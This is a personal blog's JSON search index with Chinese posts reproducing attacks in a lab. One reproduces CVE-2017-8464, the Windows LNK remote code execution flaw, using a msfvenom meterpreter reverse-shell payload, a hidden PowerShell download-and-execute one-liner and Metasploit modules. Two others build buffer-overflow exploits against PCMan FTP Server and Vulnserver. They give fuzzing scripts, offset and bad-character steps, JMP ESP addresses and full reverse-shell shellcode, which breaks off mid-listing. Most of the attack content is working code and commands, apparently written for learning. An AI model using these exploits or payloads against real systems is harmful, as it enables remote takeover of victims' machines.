{"meta":{"title":"Sheng 's blog","subtitle":"Sheng","description":"","author":"Sheng","url":"https://ms12020.github.io","root":"/"},"pages":[{"title":"404","date":"2020-05-29T16:00:00.000Z","updated":"2021-04-10T11:08:39.449Z","comments":true,"path":"404/index.html","permalink":"https://ms12020.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:54.282Z","comments":true,"path":"about/index.html","permalink":"https://ms12020.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-10T10:23:38.000Z","updated":"2021-04-10T11:06:34.186Z","comments":true,"path":"tags/index.html","permalink":"https://ms12020.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:13.530Z","comments":true,"path":"categories/index.html","permalink":"https://ms12020.github.io/categories/index.html","excerpt":"","text":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T12:22:13.221Z","comments":true,"path":"contact/index.html","permalink":"https://ms12020.github.io/contact/index.html","excerpt":"","text":"留言板尚未开放，想要留言可加作者QQ并进行联系。"},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-04-10T11:07:39.931Z","comments":true,"path":"friends/index.html","permalink":"https://ms12020.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"CVE-2017-8464(快捷方式远程代码执行)漏洞复现","slug":"利用CVE-2017-8464漏洞实现LNK文件远程代码执行","date":"2021-05-03T03:33:59.636Z","updated":"2021-05-03T03:35:19.915Z","comments":true,"path":"2021/05/03/利用CVE-2017-8464漏洞实现LNK文件远程代码执行/","link":"","permalink":"https://ms12020.github.io/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"CVE-2017-8464(快捷方式远程代码执行)漏洞描述微软2017年06月13日公布两个可被利用的远程代码执行漏洞其中**(CVE-2017-8464)LNK文件远程代码执行漏洞**曾被用在Stuxnet（震网病毒）软件中。Nessus在漏洞公布24小时内就已具备漏洞检查发现能力，Tenable用户只需要自动更新到最新的漏洞插件库，就能具备该漏洞发现能力。RCE漏洞存在于Windows处理LNK文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。 漏洞名称：LNK文件远程代码执行漏洞漏洞编号：CVE-2017-8464漏洞等级：严重漏洞概要：如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 攻击者可以通过可移动驱动器(U盘)或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 漏洞利用条件和方式：远程利用漏洞影响范围: Microsoft Windows 10 Version 1607 for 32-bit Systems Microsoft Windows 10 Version 1607 for x64-based Systems Microsoft Windows 10 for 32-bit Systems Microsoft Windows 10 for x64-based Systems Microsoft Windows 10 version 1511 for 32-bit Systems Microsoft Windows 10 version 1511 for x64-based Systems Microsoft Windows 10 version 1703 for 32-bit Systems Microsoft Windows 10 version 1703 for x64-based Systems Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 8.1 for 32-bit Systems Microsoft Windows 8.1 for x64-based Systems Microsoft Windows RT 8.1 服务器系统 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2012 Microsoft Windows Server 2012 R2 Microsoft Windows Server 2016 漏洞复现Kali： 172.16.9.195 靶机：172.16.9.178 1、Kali生成一个ps1的反弹shell木马 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f psh-reflection>/root/search.ps1 2、Kali开启http服务，将search.ps1文件移动至web根目录下 mv search.ps1 /var/www/html systemctl start apache2 3、靶机访问Kali web服务器下的search.ps1文件，发现可以直接访问 4、在靶机上创建一个PowerShell远程快捷方式 powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1\" 5、Kali进行监听，靶机执行后门文件 use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp show options set LHOST 172.16.9.195 set lport 4448 exploit msf模块实现msfconsole search cve-2017-8464 use exploit/windows/fileformat/cve_2017_8464_lnk_rce set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 172.16.9.195 exploit 在/root/.msf4/local目录下生成我们的利用文件 全部复制到移动磁盘里面(u盘拷贝) 然后在msf中监听 search multi/handler use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 172.16.9.195 run","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"LNK","slug":"LNK","permalink":"https://ms12020.github.io/tags/LNK/"}]},{"title":"缓冲区溢出分析与利用(一)","slug":"缓冲区溢出分析与利用(一)","date":"2021-04-25T12:16:08.949Z","updated":"2021-04-26T08:08:30.831Z","comments":true,"path":"2021/04/25/缓冲区溢出分析与利用(一)/","link":"","permalink":"https://ms12020.github.io/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%B8%80)/","excerpt":"","text":"PCMan’s FTP Server缓冲区溢出分析与利用知识大部分来源于学长Sheng(Sheng’s Blog) 简单原理 简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了 查找缓冲区溢出模糊测试(Fuzzing) 因为我们要完成一次缓冲区溢出测试，因此我们现在就需要知道哪里会发生缓冲区溢出，这里我们就需要进行模糊测试(fuzzing),现在我们需要发送不同长度和内容的自定义字符串到我们要测试的输入点，如果程序崩溃,那么我们就使用调试工具调查一下为什么会崩溃，可不可以利用,这里我们以PCMan’s FTP Server 2.0.7为例子 首先来测试一下用户名这个输入点有没有存在问题。 #!/usr/bin/env python import sys import socket # 通过调用程序后面的第一个参数得到IP地址 host = sys.argv[1] # 通过调用程序后面的第二个参数目标的端口,转换成int类型 port = int(sys.argv[2]) # 设置初始字符数列为100 fuzz = 100 while True: try: # 创建套接字 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 进行连接，connect参数为元组 s.connect((host, port)) s.settimeout(2) # 对用户名变量进行溢出测试 s.send(\"USER\" + \"A\"*fuzz) s.recv(1024) s.send(\"PASS Sheng\") s.recv(1024) print \"Send str length: \" + str(fuzz) # 步长 fuzz += 100 except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() 打开Immunityinc debugger，然后File-&gt;Attach (首先要确保FTP程序已经在运行) 此时程序已经加载进来，是暂停状态， 我们使用快捷键F9让程序跑起来，也可以使用菜单栏的运行按钮 当程序处于Running状态的时候，我们再一次运行fuzzing.py脚本。 查找偏移量（Finding the offset） 使用Metasploit的pattern_create工具创建一个500大小的字符串 通过上面的测试，大概判断溢出字符在2000-2100, 那么我们填写&#39;A&#39; * 1900 + &quot;工具生成字符&quot; 构成payload发送至FTP服务端 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2000 payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + payload) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() EIP寄存器的值是0x64413564, 为了计算这个值偏移量，我们使用Metasploit中的另一个工具pattern_offset来确定字节数 ./pattern_offset.rb -l 500 -q 61413161 # -q参数为要查询的地址，-l参数为要查询的字符序列的长度 # 上图中我们得出的地址是 0x61413161, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 61413161 计算结果为4, 也就是说覆盖返回地址是在[2005-2009] 这四个字节 验证 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() 发现EIP（程序返回地址）被我们上面的4个B给覆盖了，到这一步，我们已经可以精确的覆盖EIP了 寻找shellcode位置 在上面程序pyload后面加100个C，然后执行 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + \"C\"*100) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() 可以看到，这里ESP指向的是我们在EIP后面给的100个C, 现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置 查看可存放shellcode的位置大小#!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + \"C\"*1000) s.recv(1024) s.send(\"PASS Sheng\") s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() 发现足够容纳shellcode的大小(普通的shellcode大小为300-400字节) 查找坏字符 不同类型的程序，协议，漏洞，会将某些字符认为时坏字符，这些字符有固定用途 返回地址、Shellcode、butter中都不能出现坏字符 NULL byte0x00表示字符串的结束 renturn 0x0D表示换行，表示命令输入完成 0x0A表示回车 查找坏字符思路： 发送(0x00–0xff)256个字符，查找所有坏字符 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\" ) while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz + \"B\"*4 + badchars) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() finally: s.close() 发现坏字符之后0x0a 重定向数据流 用ESP地址代替EIP的值，但是ESP地址是变化的，不能一直按照同一个地址进行编码 思路： 在内存地址中寻找固定的系统模块 jmp esp是汇编语言,转成十六进制可以使用nasm_shell.rb 在模块中寻找JMP ESP指令的地址跳转，再由该指令间接跳转至ESP，从而执行shellcode 使用Immunityinc debugger 在程序的dll中找到具有JMP ESP命令的内存地址 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2004 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((host, port)) s.settimeout(2) s.send(\"USER\" + \"A\"*fuzz +\"\\x7b\\x46\\x86\\x7c\" + \"C\"*500 ) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End..., Send str length: \" + str(fuzz) sys.exit() s.close() 这里我们选择kernel32.dll 进行搜索， 搜索JMP ESP命令 这里返回的内存地址为0x7C86467B, 这个地址没有坏字符，我们可以来利用（坏字符是会破坏我们漏洞的字符，如0x00）,因为这里我们是小端显示，所以构造shellcode的时候需要倒过来写！ 按F7执行下一步 生成shellcodemsfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b \"\\x00\\x0a\\x0d\" -a x86 # -b \"\\x00\\x0a\\x0d\" 去掉坏字符 #!/usr/bin/env python import sys import socket buf = b\"\" buf += b\"\\xdd\\xc1\\xd9\\x74\\x24\\xf4\\x58\\xbb\\x23\\x98\\x46\\x1c\\x29\" buf += b\"\\xc9\\xb1\\x52\\x31\\x58\\x17\\x83\\xc0\\x04\\x03\\x7b\\x8b\\xa4\" buf += b\"\\xe9\\x87\\x43\\xaa\\x12\\x77\\x94\\xcb\\x9b\\x92\\xa5\\xcb\\xf8\" buf += b\"\\xd7\\x96\\xfb\\x8b\\xb5\\x1a\\x77\\xd9\\x2d\\xa8\\xf5\\xf6\\x42\" buf += b\"\\x19\\xb3\\x20\\x6d\\x9a\\xe8\\x11\\xec\\x18\\xf3\\x45\\xce\\x21\" buf += b\"\\x3c\\x98\\x0f\\x65\\x21\\x51\\x5d\\x3e\\x2d\\xc4\\x71\\x4b\\x7b\" buf += b\"\\xd5\\xfa\\x07\\x6d\\x5d\\x1f\\xdf\\x8c\\x4c\\x8e\\x6b\\xd7\\x4e\" buf += b\"\\x31\\xbf\\x63\\xc7\\x29\\xdc\\x4e\\x91\\xc2\\x16\\x24\\x20\\x02\" buf += b\"\\x67\\xc5\\x8f\\x6b\\x47\\x34\\xd1\\xac\\x60\\xa7\\xa4\\xc4\\x92\" buf += b\"\\x5a\\xbf\\x13\\xe8\\x80\\x4a\\x87\\x4a\\x42\\xec\\x63\\x6a\\x87\" buf += b\"\\x6b\\xe0\\x60\\x6c\\xff\\xae\\x64\\x73\\x2c\\xc5\\x91\\xf8\\xd3\" buf += b\"\\x09\\x10\\xba\\xf7\\x8d\\x78\\x18\\x99\\x94\\x24\\xcf\\xa6\\xc6\" buf += b\"\\x86\\xb0\\x02\\x8d\\x2b\\xa4\\x3e\\xcc\\x23\\x09\\x73\\xee\\xb3\" buf += b\"\\x05\\x04\\x9d\\x81\\x8a\\xbe\\x09\\xaa\\x43\\x19\\xce\\xcd\\x79\" buf += b\"\\xdd\\x40\\x30\\x82\\x1e\\x49\\xf7\\xd6\\x4e\\xe1\\xde\\x56\\x05\" buf += b\"\\xf1\\xdf\\x82\\x8a\\xa1\\x4f\\x7d\\x6b\\x11\\x30\\x2d\\x03\\x7b\" buf += b\"\\xbf\\x12\\x33\\x84\\x15\\x3b\\xde\\x7f\\xfe\\x4e\\x18\\x7a\\x90\" buf += b\"\\x26\\x24\\x84\\x7d\\xe6\\xa1\\x62\\x17\\x18\\xe4\\x3d\\x80\\x81\" buf += b\"\\xad\\xb5\\x31\\x4d\\x78\\xb0\\x72\\xc5\\x8f\\x45\\x3c\\x2e\\xe5\" buf += b\"\\x55\\xa9\\xde\\xb0\\x07\\x7c\\xe0\\x6e\\x2f\\xe2\\x73\\xf5\\xaf\" buf += b\"\\x6d\\x68\\xa2\\xf8\\x3a\\x5e\\xbb\\x6c\\xd7\\xf9\\x15\\x92\\x2a\" buf += b\"\\x9f\\x5e\\x16\\xf1\\x5c\\x60\\x97\\x74\\xd8\\x46\\x87\\x40\\xe1\" buf += b\"\\xc2\\xf3\\x1c\\xb4\\x9c\\xad\\xda\\x6e\\x6f\\x07\\xb5\\xdd\\x39\" buf += b\"\\xcf\\x40\\x2e\\xfa\\x89\\x4c\\x7b\\x8c\\x75\\xfc\\xd2\\xc9\\x8a\" buf += b\"\\x31\\xb3\\xdd\\xf3\\x2f\\x23\\x21\\x2e\\xf4\\x43\\xc0\\xfa\\x01\" buf += b\"\\xec\\x5d\\x6f\\xa8\\x71\\x5e\\x5a\\xef\\x8f\\xdd\\x6e\\x90\\x6b\" buf += b\"\\xfd\\x1b\\x95\\x30\\xb9\\xf0\\xe7\\x29\\x2c\\xf6\\x54\\x49\\x65\" # \"\\x90\" * 30 30个无操作符 payload = \"A\" * 2004 + \"\\x7b\\x46\\x86\\x7c\" + \"\\x90\" * 30 + buf host = sys.argv[1] # receive IP port = int(sys.argv[2]) # receive port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(\"USER \" + payload) s.recv(1024) 本地监听4455端口 nc -vlp 4455","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"}]},{"title":"缓冲区溢出分析与利用(二)","slug":"缓冲区溢出分析与利用(二)","date":"2021-04-25T12:16:00.591Z","updated":"2021-04-25T12:17:17.724Z","comments":true,"path":"2021/04/25/缓冲区溢出分析与利用(二)/","link":"","permalink":"https://ms12020.github.io/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%BA%8C)/","excerpt":"","text":"Vulnserver溢出漏洞分析与利用 vulnserver.exe是运行在windows上的程序，启动后，等待接收TCP连接。 信息收集nmap扫描目标机，得知开启9999端口，即vulnserver程序。 模糊测试(Fuzzing)测试是否存在缓冲区溢出问题 模糊测试py脚本如下： #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 100 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz) s.recv(1024) print \"Send str length: \" + str(fuzz) fuzz += 150 except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() 进行模糊测试 服务崩溃，EIP为发送的A 说明该服务TRUN命令存在缓冲区溢出漏洞 查找偏移量（Finding the offset） 使用Metasploit的pattern_create工具创建一个500大小的字符串 查找偏移量py脚本如下： #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2000 payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + payload) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() 重启服务Ctrl+2-&gt;F9，开始查找偏移量测试 EIP寄存器的值是0x41316141 使用Metasploit工具pattern_offset来确定字节数 ./pattern_offset.rb -l 500 -q 41316141 # -q参数为要查询的地址，-l参数为要查询的字符序列的长度 # 上图中我们得出的地址是 0x61413161, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 61413161 计算结果为3, 也就是说覆盖返回地址是在[2003-2007] 这四个字节 验证偏移量地址 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + 'B'*4 + 'C'*1000) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() 程序崩溃后EIP为4个B，说明目前我们已经可以精确覆盖EIP了 覆盖EIP 让EIP重写为JMP ESP，以便把程序控制劫持到ESP处，从而能够运行我们的shellcode。 使用Metasploit的nasm_shell工具查询JMP ESP的十六进制值 寻找可利用的跳板在Immunity Debugger中使用mona脚本查找可以利用的指令跳板 方法一：!mona modules //找到SEH、ADLR等均为false的dll，作为指令跳板，此例中为essfunc.dll !mona find -s &quot;\\xff\\xe4&quot; -m essfunc.dll // 找到essfunc.dll的JMP ESP指令位置，即地址[625011af] 方法二：!mona jmp -r esp // 效果同上，直接找到essfunc.dll的JMP ESP指令地址，同样为[625011af] 将shellcode中要准备覆盖EIP的位置修改为&#39;\\xaf\\x11\\x50\\x62&#39; #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xaf\\x11\\x50\\x62' + 'C'*1000) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() 可以看到，这里ESP指向的是我们在EIP后面给的1000个C, 现在我们是要将C替换成我们希望运行的Shellcode。 查找坏字节查找坏字符思路： 发送(0x00–0xff)256个字符，查找所有坏字符 #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\" ) while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xbb\\x11\\x50\\x62' + badchars) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() 可以看到所有字节都正常显示，表示没有需要过滤的坏字节。说明除了”\\x00”以外的字符都可使用。 生成shellcode利用msf生成shellcode msfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b \"\\x00\\x0a\\x0d\" -a x86 # -b \"\\x00\\x0a\\x0d\" 去掉坏字符 exp如下： #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 buf = b\"\" buf += b\"\\xbd\\xbd\\x7a\\xc7\\xf1\\xd9\\xc3\\xd9\\x74\\x24\\xf4\\x58\\x2b\" buf += b\"\\xc9\\xb1\\x52\\x31\\x68\\x12\\x83\\xc0\\x04\\x03\\xd5\\x74\\x25\" buf += b\"\\x04\\xd9\\x61\\x2b\\xe7\\x21\\x72\\x4c\\x61\\xc4\\x43\\x4c\\x15\" buf += b\"\\x8d\\xf4\\x7c\\x5d\\xc3\\xf8\\xf7\\x33\\xf7\\x8b\\x7a\\x9c\\xf8\" buf += 